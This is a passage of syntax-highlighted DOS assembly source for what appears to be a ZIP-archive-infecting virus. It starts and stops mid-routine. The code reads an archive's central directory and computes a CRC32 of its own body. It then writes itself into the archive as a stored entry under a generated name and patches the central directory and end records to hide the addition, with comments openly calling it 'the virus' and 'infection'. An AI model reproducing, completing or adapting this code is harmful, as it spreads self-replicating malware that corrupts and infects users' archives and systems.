                                                </span><span class="sc1">; then boom bidibyebye</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">55000</span><span class="sc0">                                    </span><span class="sc1">; if sizeofcentral &gt; 55 k</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">kern_error</span><span class="sc0">                                   </span><span class="sc1">; then boom bidibyebye</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sizeofcentral</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">; mov 0 in sizeofcentral+2</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; get offset of central </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; directory </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">startOfcentral</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; restore file handler</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">startOfcentral</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">startOfcentral</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; set cx/dx to the central </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">startOfcentral</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; directory</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; go now on central dir.</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                         </span><span class="sc1">; save ax,dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                                      </span><span class="sc1">; read and save central</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sizeofcentral</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; directory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">centraltemporary</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                                      </span><span class="sc1">; read and save the end of  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sizeofend</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; central directory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                          </span><span class="sc1">; restore offset of central</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                          </span><span class="sc1">; dir</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; go for it</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_a_name</span><span class="sc0">                                 </span><span class="sc1">; now we generate a name</span><span class="sc0">
                                                </span><span class="sc1">; see companioning over zip</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">                             </span><span class="sc1">; get the CRC32 of this </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                                </span><span class="sc1">; program</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_calc</span><span class="sc0">                                   

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">zipcrc</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                        </span><span class="sc1">; save it into our header</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">zipcrc</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                         </span><span class="sc1">; save cx dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                      </span><span class="sc1">; write our local header</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">CentralHeader</span><span class="sc4">-</span><span class="sc5">localHeader</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">localHeader</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">writename</span><span class="sc0">                                  </span><span class="sc1">; write the filename</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">zipcrc</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">; and reset it </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">zipcrc</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; becoz it'll generate</span><span class="sc0">
                                                </span><span class="sc1">; confusion later</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; write this code</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                        </span><span class="sc1">; go here</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporary1</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; save this position because</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporary1</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; it'll be the start of </span><span class="sc0">
                                                </span><span class="sc1">; central directory</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                          </span><span class="sc1">; restore dx cx ( CRC32</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">zipccrc</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; put program crc32 in </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">zipccrc</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; our cental header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                      </span><span class="sc1">; write the old</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sizeofcentral</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; central directory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">centraltemporary</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">startofcentral</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; set in our central header</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CentralHeader</span><span class="sc4">+</span><span class="sc2">2ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; the start of the virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">startofcentral</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; who are equal of the </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CentralHeader</span><span class="sc4">+</span><span class="sc2">2ah</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; old startofcentral</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                      </span><span class="sc1">; write our centralHeader</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endofCentral</span><span class="sc4">-</span><span class="sc5">CentralHeader</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CentralHeader</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">writename</span><span class="sc0">                                  </span><span class="sc1">; write our name</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Temporary1</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; increment the number</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Temporary1</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; of entries in endofcent.</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Temporary1</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc5">Endofcentral</span><span class="sc4">-</span><span class="sc5">CentralHeader</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZipFnln</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; increase the size of</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporary1</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; the central dir in </span><span class="sc0">
                                                </span><span class="sc1">; end of central</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sizeofend</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">                        </span><span class="sc1">; write temporary1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">novalid_or_badzip</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; anything suspect during</span><span class="sc0">
                                                </span><span class="sc1">; infection then close</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                                      </span><span class="sc1">; the file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">go</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">; moving over the file</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">                                      </span><span class="sc1">; pretty often used</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">LocalHeader</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ziplogsig</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                </span><span class="sc1">; signature</span><span class="sc0">
</span><span class="sc5">zipver</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">                          </span><span class="sc1">; ver need to extract</span><span class="sc0">
</span><span class="sc5">zipgenflag</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; no particulary flag</span><span class="sc0">
</span><span class="sc5">zipMthd</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; no compression</span><span class="sc0">
</span><span class="sc5">zipTime</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">                      </span><span class="sc1">; aleatory</span><span class="sc0">
</span><span class="sc5">zipDate</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">                      </span><span class="sc1">; aleatory</span><span class="sc0">
</span><span class="sc5">zipCrc</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; unknown</span><span class="sc0">
</span><span class="sc5">zipSize</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                    </span><span class="sc1">; unknown</span><span class="sc0">
</span><span class="sc5">zipUncmp</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                    </span><span class="sc1">; unknown</span><span class="sc0">
</span><span class="sc5">ZipFnln</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; unknown</span><span class="sc0">
</span><span class="sc5">ZipXtraLn</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; unknown</span><span class="sc0">

</span><span class="sc5">CentralHeader</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">zipCenSig</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">                </span><span class="sc1">; central signature</span><span class="sc0">
</span><span class="sc5">zipCver</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">                           </span><span class="sc1">; ver made by</span><span class="sc0">
</span><span class="sc5">zipCos</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; Host Operating -&gt; All</span><span class="sc0">
</span><span class="sc5">zipCvxt</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; Ver need to extract</span><span class="sc0">
</span><span class="sc5">ZipCeXos</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; Ver need to extract.</span><span class="sc0">
</span><span class="sc5">ZipCflg</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; No encryption !</span><span class="sc0">
</span><span class="sc5">ZipCmthd</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; Method : Store it !</span><span class="sc0">
</span><span class="sc5">ZipCtim</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">                      </span><span class="sc1">; last mod time</span><span class="sc0">
</span><span class="sc5">ZipCDat</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">                      </span><span class="sc1">; last mod date</span><span class="sc0">
</span><span class="sc5">ZipCCrc</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Crc-32 unknown</span><span class="sc0">
</span><span class="sc5">ZipCsiz</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                    </span><span class="sc1">; Compressed size unknown</span><span class="sc0">
</span><span class="sc5">ZipCunc</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                    </span><span class="sc1">; Uncompressed size unkown</span><span class="sc0">
</span><span class="sc5">ZipCfnl</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; filename length unknown</span><span class="sc0">
</span><span class="sc5">ZipCxtl</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; Extra Field length 0</span><span class="sc0">
</span><span class="sc5">ZipCcml</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; file comment length 0</span><span class="sc0">
</span><span class="sc5">ZipDsk</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; Disk number start (?) 0</span><span class="sc0">
</span><span class="sc5">ZipInt</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; Internal file attribute no</span><span class="sc0">
</span><span class="sc5">ZipExt</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; external file attrib -&gt; 0</span><span class="sc0">
</span><span class="sc5">ZipOfst</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; relativeoffset local head</span><span class="sc0">
                                                </span><span class="sc1">; unknown</span><span class="sc0">

</span><span class="sc5">EndOfCentral</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">crc_calc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                 </span><span class="sc1">; save file handle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">; cx and si</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_table</span><span class="sc0">              </span><span class="sc1">; render crc table</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                               </span><span class="sc1">; bp equal numbah of start process</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">                           </span><span class="sc1">; reset counter</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Crc_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
